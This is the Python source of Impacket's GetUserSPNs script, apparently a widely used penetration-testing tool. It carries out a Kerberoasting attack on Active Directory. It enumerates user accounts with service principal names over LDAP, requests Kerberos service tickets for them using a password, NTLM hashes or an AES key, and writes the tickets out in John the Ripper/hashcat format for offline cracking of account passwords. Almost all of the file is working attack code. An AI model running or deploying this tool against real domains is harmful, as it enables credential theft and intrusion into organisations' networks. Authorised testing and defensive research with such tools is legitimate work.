#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#     This module will try to find Service Principal Names that are associated with normal user account.
#     Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
#     will encrypt the ticket with the account the SPN is running under, this could be used for an offline
#     bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
#     This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
#     https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
#
#     Original idea of implementing this in Python belongs to @skelsec and his
#     https://github.com/skelsec/PyKerberoast project
#
#     This module provides a Python implementation for this attack, adding also the ability to PtH/Ticket/Key.
#     Also, disabled accounts won't be shown.
#
# ToDo:
#  [X] Add the capability for requesting TGS and output them in JtR/hashcat format
#  [X] Improve the search filter, we have to specify we don't want machine accounts in the answer
#      (play with userAccountControl)
#


import argparse
import logging
import os
import sys
from datetime import datetime
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder
from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
from impacket.examples import logger
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection
from impacket.ntlm import compute_lmhash, compute_nthash

class GetUserSPNs:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print outputFormat.format(*header)
        print '  '.join(['-' * itemLen for itemLen in colLen])

        # And now the rows
        for row in items:
            print outputFormat.format(*row)

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputFileName = cmdLineOptions.outputfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGS = cmdLineOptions.request
        self.__kdcHost = cmdLineOptions.dc_ip
        self.__saveTGS = cmdLineOptions.save
        self.__requestUser = cmdLineOptions.request_user
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__targetDomain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]
        # We can't set the KDC to a custom IP when requesting things cross-domain
        # because then the KDC host will be used for both
        # the initial and the referral ticket, which breaks stuff.
        if user_domain != target_domain and self.__kdcHost:
            logging.warning('DC ip will be ignored because of cross-domain targeting.')
            self.__kdcHost = None

    def getMachineName(self):
        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            s = SMBConnection(self.__kdcHost, self.__kdcHost)
        else:
            s = SMBConnection(self.__targetDomain, self.__targetDomain)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise('Error while anonymous logging into %s' % self.__domain)
        else:
            try:
                s.logoff()
            except Exception:
                # We don't care about exceptions here as we already have the required
                # information. This also works around the current SMB3 bug
                pass
        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self):
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except:
            # No cache present
            pass
        else:
            # retrieve user and domain information from CCache file if needed
            if self.__domain == '':
                domain = ccache.principal.realm['data']
            else:
                domain = self.__domain
            logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
            creds = ccache.getCredential(principal)
            if creds is not None:
                TGT = creds.toTGT()
                logging.debug('Using TGT from cache')
                return TGT
            else:
                logging.debug("No valid credentials found in cache. ")

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                compute_lmhash(self.__password),
                                                                compute_nthash(self.__password), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
            except Exception, e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcHost)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash),
                                                                unhexlify(self.__nthash), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT

    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # According to RFC4757 the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
            if fd is None:
                print entry
            else:
                fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
            if fd is None:
                print entry
            else:
                fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
            if fd is None:
                print entry
            else:
                fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
            if fd is None:
                print entry
            else:
                fd.write(entry+'\n')
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        if self.__saveTGS is True:
            # Save the ticket
            logging.debug('About to save TGS for %s' % username)
            ccache = CCache()
            try:
                ccache.fromTGS(tgs, oldSessionKey, sessionKey )
                ccache.saveFile('%s.ccache' % username)
            except Exception, e:
                logging.error(str(e))

    def run(self):
        if self.__doKerberos:
            target = self.getMachineName()
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.baseDN, self.__kdcHost)
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcHost)
        except ldap.LDAPSessionError, e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.baseDN, self.__kdcHost)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcHost)
            else:
                raise

        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))"

        if self.__requestUser is not None:
            searchFilter += '(sAMAccountName:=%s))' % self.__requestUser
        else:
            searchFilter += ')'

        try:
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
        except ldap.LDAPSearchError, e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if attribute['type'] == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif attribute['type'] == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                    elif attribute['type'] == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif attribute['type'] == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif attribute['type'] == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif attribute['type'] == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName,memberOf, pwdLastSet, lastLogon])
            except Exception, e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))
                pass

        if len(answers)>0:
            self.printTable(answers, header=[ "ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon"])
            print '\n\n'

            if self.__requestTGS is True or self.__requestUser is not None:
                # Let's get unique user names and a SPN to request a TGS for
                users = dict( (vals[1], vals[0]) for vals in answers)

                # Get a TGT for the current user
                TGT = self.getTGT()
                if self.__outputFileName is not None:
                    fd = open(self.__outputFileName, 'w+')
                else:
                    fd = None
                for user, SPN in users.iteritems():
                    try:
                        serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain,
                                                                                self.__kdcHost,
                                                                                TGT['KDC_REP'], TGT['cipher'],
                                                                                TGT['sessionKey'])
                        self.outputTGS(tgs, oldSessionKey, sessionKey, user, SPN, fd)
                    except Exception , e:
                        logging.error('SPN: %s - %s' % (SPN,str(e)))
                if fd is not None:
                    fd.close()

        else:
            print "No entries found!"


# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print version.BANNER

    parser = argparse.ArgumentParser(add_help = True, description = "Queries target domain for SPNs that are running "
                                                                    "under a user account")

    parser.add_argument('target', action='store', help='domain/username[:password]')
    parser.add_argument('-target-domain', action='store', help='Domain to query/request if different than the domain of the user. '
                                                               'Allows for Kerberoasting across trusts.')
    parser.add_argument('-request', action='store_true', default='False', help='Requests TGS for users and output them '
                                                                               'in JtR/hashcat format (default False)')
    parser.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
                                                          'to the user specified (just the username, no domain needed)')
    parser.add_argument('-save', action='store_true', default='False', help='Saves TGS requested to disk. Format is '
                                                                            '<username>.ccache. Auto selects -request')
    parser.add_argument('-outputfile', action='store',
                        help='Output filename to write ciphers in JtR/hashcat format')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                                                              'ommited it use the domain part (FQDN) '
                                                                              'specified in the target parameter. Ignored'
                                                                              'if -target-domain is specified.')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re
    # This is because I'm lazy with regex
    # ToDo: We need to change the regex to fullfil domain/username[:password]
    targetParam = options.target+'@'
    userDomain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(targetParam).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if userDomain is '':
        logging.critical('userDomain should be specified!')
        sys.exit(1)

    if options.target_domain:
        targetDomain = options.target_domain
    else:
        targetDomain = userDomain

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.save is True or options.outputfile is not None:
        options.request = True

    try:
        executer = GetUserSPNs(username, password, userDomain, targetDomain, options)
        executer.run()
    except Exception, e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
